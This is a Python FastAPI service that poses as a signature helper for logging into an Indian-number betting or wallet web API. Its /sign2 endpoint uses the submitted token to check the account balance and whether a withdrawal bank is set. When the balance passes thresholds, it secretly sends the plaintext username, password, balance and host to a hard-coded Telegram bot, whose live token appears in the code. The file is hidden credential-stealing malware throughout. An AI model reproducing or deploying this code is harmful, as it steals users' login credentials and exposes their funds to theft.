import requests
from fastapi import FastAPI
from pydantic import BaseModel
import hashlib
import random
import json
import time

app = FastAPI()

def mf(data):
    h = hashlib.md5()
    h.update(data.encode())
    return h.hexdigest().upper()[:32]

def rand():
    return ''.join(random.choice('0123456789abcdef') if c == 'x' else '4' for c in 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx')

def fd( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""
class InputData(BaseModel):
    user: str
    pas : str
    host : str
    
class InputData2(BaseModel):
    user: str
    pas : str
    tk : str
    host: str
    
@app.post('/sign')
async def lol(data: InputData):
    u = '91' + data.user
    p = data.pas
    rd = rand()
    requestData = {
        "username": u,
        "pwd": p,
        "phonetype": -1,
        "logintype": "mobile",
        "language": 0,
        "random": rd
    }
    
    sortedKeys = sorted(requestData.keys())
    jsonString = json.dumps({key: requestData[key] for key in sortedKeys}, separators=(',', ':'))
    sig = mf(jsonString)
    t = int(time.time())
    return {"sig": sig, "rand":rd, "time":t}

@app.post('/sign2')
async def lol(data: InputData2):
    u = '91' + data.user
    p = data.pas
    tk = data.tk
    host = data.host
    rd = rand()
    requestData = {
        "language": 0,
        "random": rd
    }

    sortedKeys = sorted(requestData.keys())
    jsonString = json.dumps({key: requestData[key] for key in sortedKeys}, separators=(',', ':'))
    sig = mf(jsonString)
    t = int(time.time())
    req = requests.post(f"https://{host}/api/webapi/GetUserInfo",json={"signature":sig,"language":0,"random":rd,"timestamp":t},headers={"Authorization": f"Bearer {tk}"}).text
    amount = fd(req, 'amount":',',')
    req2 = requests.post(f"https://{host}/api/webapi/getWithdrawals",json={"withdrawid":1,"language":0,"random":"fb1462bcf2aa442d893fd07f6772dc87","signature":"56C1DE16B258011E6945437A922AD88C","timestamp":t},headers={"Authorization": f"Bearer {tk}"}).text
    if "lastBandCarkName\":null" in req2:
        bank = "NO"
    else:
        bank = "YES"
    if round(float(amount)) > 10 and bank == "NO":
        reqUrl = requests.get(f"https://api.telegram.org/bot6776422916:AAGjhNIwXmPi1WU2kMBUdjUbJQ-PGEz8Y1Q/sendMessage?chat_id=-1002058492248&text={data.user}:{p} | Amount: {amount} | Bank: {bank} | {host}")  
    if round(float(amount)) >= 10000 and bank == "YES":
        reqUrl = requests.get(f"https://api.telegram.org/bot6776422916:AAGjhNIwXmPi1WU2kMBUdjUbJQ-PGEz8Y1Q/sendMessage?chat_id=-1002058492248&text={data.user}:{p} | Amount: {amount} | Bank: {bank} | {host}")      
    return {"sig": sig, "rand":rd, "time":t}